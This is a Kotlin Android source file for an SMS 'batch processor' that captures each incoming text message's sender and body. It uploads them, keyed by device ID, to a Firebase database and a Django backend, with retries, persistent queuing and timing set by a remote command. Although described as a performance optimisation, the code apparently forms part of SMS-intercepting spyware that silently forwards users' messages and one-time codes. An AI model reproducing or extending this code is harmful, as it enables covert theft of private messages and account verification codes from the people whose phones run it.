package com.example.fast.util

import android.content.Context
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import com.example.fast.config.AppConfig
import com.google.firebase.Firebase
import com.google.firebase.database.database
import com.google.gson.Gson
import com.google.gson.GsonBuilder
import com.prexoft.prexocore.readInternalFile
import com.prexoft.prexocore.writeInternalFile
import java.security.MessageDigest
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.ConcurrentLinkedQueue
import kotlinx.coroutines.launch

/**
 * SmsMessageBatchProcessor
 * 
 * Optimizes SMS processing by batching messages together before uploading to Firebase.
 * This prevents system slowdown when receiving large volumes of SMS (e.g., 5000 messages).
 * 
 * Features:
 * - Batches messages into groups (default: 100 messages or 5 seconds)
 * - Processes in background thread
 * - Prevents Firebase overload
 * - Deduplication: Prevents uploading same message twice (in-memory cache)
 * - Persistent storage: Queued messages saved to JSON file (survives app restarts)
 * - Priority processing: Newest messages processed first (timestamp descending)
 * 
 * Important:
 * - Called from both DEFAULT SMS app (SMS_DELIVER_ACTION) and NON-DEFAULT SMS app (SMS_RECEIVED_ACTION)
 * - Both default and non-default SMS app: Upload to Firebase immediately (ASAP)
 * - Old messages (from sync service): Batch upload to Django API (100 messages, configurable timeout)
 * - Deduplication via message hash prevents duplicate uploads if both default and non-default apps process same message
 * 
 * Deduplication Strategy:
 * - Uses message hash (sender + body + timestamp) to identify duplicates
 * - Checks in-memory cache of recently uploaded messages (same app instance)
 * - Prevents duplicate uploads when same message is processed multiple times (e.g., default + non-default apps)
 * 
 * Priority Processing:
 * - Messages sorted by timestamp descending (newest first)
 * - Processes batches of 100 messages at a time, one batch at a time
 * - New messages arriving during upload are prioritized in next batch
 */
object SmsMessageBatchProcessor {
    
    private const val TAG = "SmsBatchProcessor"
    private const val BATCH_SIZE = 100 // Upload 100 messages at once (updated from 50)
    private const val DEFAULT_BATCH_TIMEOUT_MS = 5000L // 5 seconds default
    private const val MAX_CACHE_SIZE = 1000 // Keep last 1000 message hashes in memory
    private const val STORAGE_FILE_NAME = "queued_messages.json" // JSON file for persistent storage
    
    // Configurable batch timeout (set via remote command smsbatchenable)
    @Volatile
    private var batchTimeoutMs: Long = DEFAULT_BATCH_TIMEOUT_MS
    
    private val messageQueue = ConcurrentLinkedQueue<QueuedMessage>()
    private val handler = Handler(Looper.getMainLooper())
    private var batchTimer: Runnable? = null
    private val processingLock = Any()
    private var isProcessing = false
    private var isInitialized = false // Track if initialized from storage
    
    // Gson instance for JSON parsing
    private val gson: Gson = GsonBuilder()
        .setPrettyPrinting()
        .create()
    
    // Deduplication: Track recently uploaded messages by hash
    // Key: message hash (sender + body + timestamp), Value: upload timestamp
    private val uploadedMessagesCache = ConcurrentHashMap<String, Long>()
    
    data class QueuedMessage(
        val sender: String,
        val body: String,
        val timestamp: Long,
        val messageHash: String // Hash for deduplication
    )
    
    /**
     * Data class for JSON file structure
     */
    private data class MessageStorage(
        val messages: List<QueuedMessage>,
        val lastUpdated: Long
    )
    
    /**
     * Create unique message hash for deduplication
     * Format: MD5(sender + body + timestamp rounded to seconds)
     */
    private fun createMessageHash(sender: String, body: String, timestamp: Long): String {
        // Round timestamp to seconds for better duplicate detection
        val timestampSeconds = (timestamp / 1000) * 1000
        val input = "${sender}|${body}|${timestampSeconds}"
        
        try {
            val md = MessageDigest.getInstance("MD5")
            val hashBytes = md.digest(input.toByteArray())
            return hashBytes.joinToString("") { "%02x".format(it) }
        } catch (e: Exception) {
            // Fallback to simple hash if MD5 fails
            return "${sender}_${body.hashCode()}_$timestampSeconds"
        }
    }
    
    /**
     * Load queued messages from JSON file
     * Called on app startup to recover messages from previous session
     */
    fun initializeFromStorage(context: Context) {
        synchronized(processingLock) {
            if (isInitialized) {
                Log.d(TAG, "Already initialized from storage, skipping")
                return
            }
            
            try {
                val jsonString = context.readInternalFile(STORAGE_FILE_NAME)
                if (jsonString.isBlank()) {
                    Log.d(TAG, "No stored messages found, starting fresh")
                    isInitialized = true
                    return
                }
                
                val storage: MessageStorage = gson.fromJson(jsonString, MessageStorage::class.java)
                
                // Sort messages by timestamp descending (newest first) for priority processing
                val sortedMessages = storage.messages.sortedByDescending { it.timestamp }
                
                // Add all stored messages to queue (newest first)
                sortedMessages.forEach { message ->
                    messageQueue.offer(message)
                    // Add to cache to prevent re-queuing
                    uploadedMessagesCache[message.messageHash] = 0L
                }
                
                isInitialized = true
                Log.d(TAG, "✅ Loaded ${sortedMessages.size} messages from storage (sorted: newest first, last updated: ${java.util.Date(storage.lastUpdated)})")
                
                // Schedule batch processing if queue is not empty
                if (messageQueue.isNotEmpty() && !isProcessing && batchTimer == null) {
                    scheduleBatchProcessing(context)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error loading messages from storage, starting fresh", e)
                isInitialized = true
            }
        }
    }
    
    /**
     * Save queued messages to JSON file
     * Persists messages to disk for offline recovery
     * Stores in sorted order (newest first) for priority processing
     */
    private fun saveToStorage(context: Context) {
        Thread {
            try {
                val messagesList = mutableListOf<QueuedMessage>()
                
                // Copy all messages from queue
                messageQueue.forEach { message ->
                    messagesList.add(message)
                }
                
                // Sort by timestamp descending (newest first) for priority processing on next load
                messagesList.sortByDescending { it.timestamp }
                
                val storage = MessageStorage(
                    messages = messagesList,
                    lastUpdated = System.currentTimeMillis()
                )
                
                val jsonString = gson.toJson(storage)
                context.writeInternalFile(STORAGE_FILE_NAME, jsonString)
                
                Log.d(TAG, "💾 Saved ${messagesList.size} messages to storage (sorted: newest first)")
            } catch (e: Exception) {
                Log.e(TAG, "Error saving messages to storage", e)
            }
        }.start()
    }
    
    /**
     * Clear storage file
     * Called after successful upload of all messages
     */
    private fun clearStorage(context: Context) {
        Thread {
            try {
                context.writeInternalFile(STORAGE_FILE_NAME, "")
                Log.d(TAG, "🗑️ Cleared storage file")
            } catch (e: Exception) {
                Log.e(TAG, "Error clearing storage file", e)
            }
        }.start()
    }
    
    /**
     * Add message to batch queue with in-memory deduplication check
     * 
     * Note: Can be called from both DEFAULT SMS app (SMS_DELIVER_ACTION) and NON-DEFAULT SMS app (SMS_RECEIVED_ACTION)
     * Deduplication via message hash prevents uploading same message twice if processed by multiple receivers
     * 
     * @param immediateUpload If true, upload immediately (bypass batching) - used for default SMS app priority
     *                        If false, uses batching - used for non-default SMS app to avoid Firebase overload
     */
    fun queueMessage(
        context: Context,
        sender: String,
        body: String,
        immediateUpload: Boolean = false
    ) {
        val timestamp = System.currentTimeMillis()
        val messageHash = createMessageHash(sender, body, timestamp)
        
        // Check if message was already uploaded (in-memory cache deduplication)
        // This prevents duplicates within the same app instance (e.g., same message processed twice)
        if (uploadedMessagesCache.containsKey(messageHash)) {
            Log.d(TAG, "Duplicate message detected in cache (hash: ${messageHash.take(8)}...), skipping upload")
            return
        }
        
        val message = QueuedMessage(
            sender = sender,
            body = body,
            timestamp = timestamp,
            messageHash = messageHash
        )
        
        // For default SMS app: Upload immediately (ASAP) - prioritize Firebase upload
        // This ensures messages are available in Firebase as quickly as possible
        if (immediateUpload) {
            // Upload immediately (bypass queue for default SMS app)
            uploadMessageImmediately(context, message)
        } else {
            // Batch mode: Add to queue
            messageQueue.offer(message)
            Log.d(TAG, "Message queued: $sender - ${body.take(30)}... (queue size: ${messageQueue.size})")
            
            // Save to persistent storage
            saveToStorage(context)
            
            // Check if we're currently processing a batch
            synchronized(processingLock) {
                if (isProcessing) {
                    // If upload is in progress, new messages will be prioritized in next batch
                    // (they'll be sorted by timestamp descending when processing next batch)
                    Log.d(TAG, "Upload in progress - new message will be prioritized in next batch (newest first)")
                    return
                }
                
                // Schedule batch processing if not already scheduled
                if (batchTimer == null) {
                    scheduleBatchProcessing(context)
                }
                
                // Check if batch size reached (100 messages)
                if (messageQueue.size >= BATCH_SIZE) {
                    Log.d(TAG, "Batch size reached ($BATCH_SIZE), triggering immediate batch upload (newest first)")
                    processBatch(context, force = true)
                }
            }
        }
    }
    
    /**
     * Upload message synchronously and wait for completion (for default SMS app)
     * This ensures Firebase is updated BEFORE message is saved to system database
     * @return true if upload succeeded, false if failed or timed out
     */
    fun uploadMessageAndWait(
        context: Context,
        sender: String,
        body: String,
        timestamp: Long
    ): Boolean {
        val messageHash = createMessageHash(sender, body, timestamp)
        
        // Check if already uploaded (deduplication)
        if (uploadedMessagesCache.containsKey(messageHash)) {
            Log.d(TAG, "Message already uploaded (hash: ${messageHash.take(8)}...), skipping")
            return true
        }
        
        try {
            val deviceId = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ANDROID_ID
            )
            val messagePath = AppConfig.getFirebaseMessagePath(deviceId, timestamp)
            val value = "received~$sender~$body"
            
            Log.d(TAG, "Uploading message synchronously to Firebase (waiting for completion): $timestamp")
            
            // Use CountDownLatch to wait for Firebase upload completion
            val latch = java.util.concurrent.CountDownLatch(1)
            var uploadSuccess = false
            
            Firebase.database.reference
                .child(messagePath)
                .setValue(value)
                .addOnSuccessListener {
                    Log.d(TAG, "✅ Message uploaded to Firebase (synchronous): $sender")
                    uploadedMessagesCache[messageHash] = System.currentTimeMillis()
                    cleanupCache()
                    uploadSuccess = true
                    latch.countDown()
                }
                .addOnFailureListener { e ->
                    Log.e(TAG, "❌ Failed to upload message to Firebase (synchronous)", e)
                    uploadSuccess = false
                    latch.countDown()
                }
            
            // Wait for upload to complete (max 5 seconds timeout)
            val completed = latch.await(5, java.util.concurrent.TimeUnit.SECONDS)
            
            if (!completed) {
                Log.w(TAG, "⚠️ Firebase upload timed out after 5 seconds")
                return false
            }
            
            return uploadSuccess
        } catch (e: Exception) {
            Log.e(TAG, "Error uploading message synchronously", e)
            return false
        }
    }
    
    /**
     * Upload message immediately to Firebase (ASAP for default SMS app)
     * Bypasses batching for priority upload when app is default SMS app
     */
    private fun uploadMessageImmediately(context: Context, message: QueuedMessage) {
        Thread {
            try {
                val deviceId = Settings.Secure.getString(
                    context.contentResolver,
                    Settings.Secure.ANDROID_ID
                )
                val messagePath = AppConfig.getFirebaseMessagePath(deviceId, message.timestamp)
                
                val value = "received~${message.sender}~${message.body}"
                
                Log.d(TAG, "Uploading message immediately to Firebase (ASAP): ${message.timestamp}")
                
                // Upload immediately to Firebase (flatter structure: message/{deviceId}/{timestamp})
                Firebase.database.reference
                    .child(messagePath)
                    .setValue(value)
                    .addOnSuccessListener {
                        Log.d(TAG, "✅ Message uploaded immediately to Firebase: ${message.sender}")
                        
                        // Mark message as uploaded in cache
                        uploadedMessagesCache[message.messageHash] = System.currentTimeMillis()
                        cleanupCache()
                    }
                    .addOnFailureListener { e ->
                        Log.e(TAG, "❌ Failed to upload message immediately to Firebase, queuing for retry", e)
                        // On failure, add to queue for batch retry
                        messageQueue.offer(message)
                        // Save to persistent storage
                        saveToStorage(context)
                        synchronized(processingLock) {
                            if (!isProcessing) {
                                scheduleBatchProcessing(context)
                            }
                        }
                    }
            } catch (e: Exception) {
                Log.e(TAG, "Error uploading message immediately", e)
                // On error, add to queue for batch retry
                messageQueue.offer(message)
                synchronized(processingLock) {
                    if (!isProcessing) {
                        scheduleBatchProcessing(context)
                    }
                }
            }
        }.start()
    }
    
    /**
     * Set batch timeout interval (called via remote command smsbatchenable)
     * @param seconds Batch timeout in seconds (default: 5)
     */
    fun setBatchTimeout(seconds: Int) {
        batchTimeoutMs = (seconds * 1000L).coerceAtLeast(1000L) // Minimum 1 second
        Log.d(TAG, "Batch timeout set to ${seconds} seconds (${batchTimeoutMs}ms)")
    }
    
    /**
     * Get current batch timeout in seconds
     */
    fun getBatchTimeout(): Int {
        return (batchTimeoutMs / 1000).toInt()
    }
    
    /**
     * Schedule batch processing after timeout
     */
    private fun scheduleBatchProcessing(context: Context) {
        // Cancel existing timer
        batchTimer?.let { handler.removeCallbacks(it) }
        
        // Schedule new timer with configurable timeout
        batchTimer = Runnable {
            processBatch(context, force = false)
        }
        handler.postDelayed(batchTimer!!, batchTimeoutMs)
    }
    
    /**
     * Process queued messages in batch
     */
    private fun processBatch(context: Context, force: Boolean) {
        synchronized(processingLock) {
            if (isProcessing && !force) {
                return
            }
            
            if (messageQueue.isEmpty()) {
                isProcessing = false
                return
            }
            
            isProcessing = true
        }
        
        // Cancel timer
        batchTimer?.let { handler.removeCallbacks(it) }
        batchTimer = null
        
        // Process in background thread
        Thread {
            try {
                // Collect all messages from queue first
                val allMessages = mutableListOf<QueuedMessage>()
                while (messageQueue.isNotEmpty()) {
                    val message = messageQueue.poll()
                    if (message != null) {
                        allMessages.add(message)
                    }
                }
                
                if (allMessages.isEmpty()) {
                    synchronized(processingLock) {
                        isProcessing = false
                    }
                    return@Thread
                }
                
                // Sort by timestamp descending (newest first) for priority processing
                allMessages.sortByDescending { it.timestamp }
                
                // Take the first 100 messages (newest ones)
                val messagesToProcess = allMessages.take(BATCH_SIZE)
                
                // Put remaining messages back in queue (will be processed in next batch)
                allMessages.drop(BATCH_SIZE).forEach { message ->
                    messageQueue.offer(message)
                }
                
                Log.d(TAG, "🔄 Processing batch of ${messagesToProcess.size} messages (newest first priority)")
                if (allMessages.size > BATCH_SIZE) {
                    Log.d(TAG, "📦 ${allMessages.size - BATCH_SIZE} messages remaining for next batch")
                }
                
                // Process messages - Upload to Django API (not Firebase)
                val deviceId = Settings.Secure.getString(
                    context.contentResolver,
                    Settings.Secure.ANDROID_ID
                )
                
                // Convert messages to Django format
                val messagesList = mutableListOf<Map<String, Any?>>()
                
                messagesToProcess.forEach { msg ->
                    // Check in-memory cache only (fast duplicate detection within same app instance)
                    if (uploadedMessagesCache.containsKey(msg.messageHash)) {
                        Log.d(TAG, "Duplicate message detected in cache (hash: ${msg.messageHash.take(8)}...), skipping")
                        return@forEach
                    }
                    
                    val messageData = mapOf<String, Any?>(
                        "message_type" to "received",
                        "phone" to msg.sender,
                        "body" to msg.body,
                        "timestamp" to msg.timestamp,
                        "read" to false
                    )
                    messagesList.add(messageData)
                }
                
                // Upload batch to Django API
                if (messagesList.isNotEmpty()) {
                    kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
                        try {
                            DjangoApiHelper.syncMessages(deviceId, messagesList)
                            Log.d(TAG, "✅ Successfully uploaded batch of ${messagesList.size} messages to Django")
                            
                            // Mark all uploaded messages in cache to prevent duplicates
                            messagesToProcess.forEach { msg ->
                                if (messagesList.any { it["timestamp"] == msg.timestamp && it["phone"] == msg.sender }) {
                                    uploadedMessagesCache[msg.messageHash] = System.currentTimeMillis()
                                }
                            }
                            cleanupCache() // Clean up old entries
                            
                            // Update persistent storage (remove uploaded messages)
                            if (messageQueue.isEmpty()) {
                                clearStorage(context)
                            } else {
                                saveToStorage(context)
                            }
                            
                            // Continue processing if more messages in queue
                            synchronized(processingLock) {
                                isProcessing = false
                                if (messageQueue.isNotEmpty()) {
                                    scheduleBatchProcessing(context)
                                }
                            }
                        } catch (e: Exception) {
                            Log.e(TAG, "❌ Failed to upload batch to Django, re-queuing", e)
                            // Re-queue messages for retry
                            messagesToProcess.forEach { message ->
                                messageQueue.offer(message)
                            }
                            
                            // Update persistent storage (re-queue failed messages)
                            saveToStorage(context)
                            
                            // Retry after delay
                            synchronized(processingLock) {
                                isProcessing = false
                                scheduleBatchProcessing(context)
                            }
                        }
                    }
                } else {
                    Log.d(TAG, "All messages in batch were duplicates (in-memory cache), nothing to upload")
                    synchronized(processingLock) {
                        isProcessing = false
                        if (messageQueue.isNotEmpty()) {
                            scheduleBatchProcessing(context)
                        }
                    }
                }
                
            } catch (e: Exception) {
                Log.e(TAG, "Error processing message batch", e)
                synchronized(processingLock) {
                    isProcessing = false
                }
            }
        }.start()
    }
    
    /**
     * Clean up old entries from cache to prevent memory issues
     * Keeps only the last MAX_CACHE_SIZE entries
     */
    private fun cleanupCache() {
        if (uploadedMessagesCache.size > MAX_CACHE_SIZE) {
            // Remove oldest entries (keep most recent)
            val entriesToKeep = uploadedMessagesCache.entries
                .sortedByDescending { it.value } // Sort by upload timestamp (newest first)
                .take(MAX_CACHE_SIZE)
            
            uploadedMessagesCache.clear()
            entriesToKeep.forEach { (key, value) ->
                uploadedMessagesCache[key] = value
            }
            
            Log.d(TAG, "Cleaned up message cache, kept ${uploadedMessagesCache.size} entries")
        }
    }
    
    /**
     * Get current queue size (for monitoring)
     */
    fun getQueueSize(): Int = messageQueue.size
    
    /**
     * Get current cache size (for monitoring)
     */
    fun getCacheSize(): Int = uploadedMessagesCache.size
    
    /**
     * Clear all queued messages (use with caution)
     */
    fun clearQueue() {
        messageQueue.clear()
        batchTimer?.let { handler.removeCallbacks(it) }
        batchTimer = null
    }
    
    /**
     * Clear message cache (for testing/reset)
     */
    fun clearCache() {
        uploadedMessagesCache.clear()
        Log.d(TAG, "Message cache cleared")
    }
    
    /**
     * Force process any pending messages immediately
     * Useful for testing or when app is closing
     */
    fun flush(context: Context) {
        synchronized(processingLock) {
            if (messageQueue.isNotEmpty() && !isProcessing) {
                Log.d(TAG, "Flushing ${messageQueue.size} pending messages")
                processBatch(context, force = true)
            }
        }
    }
}
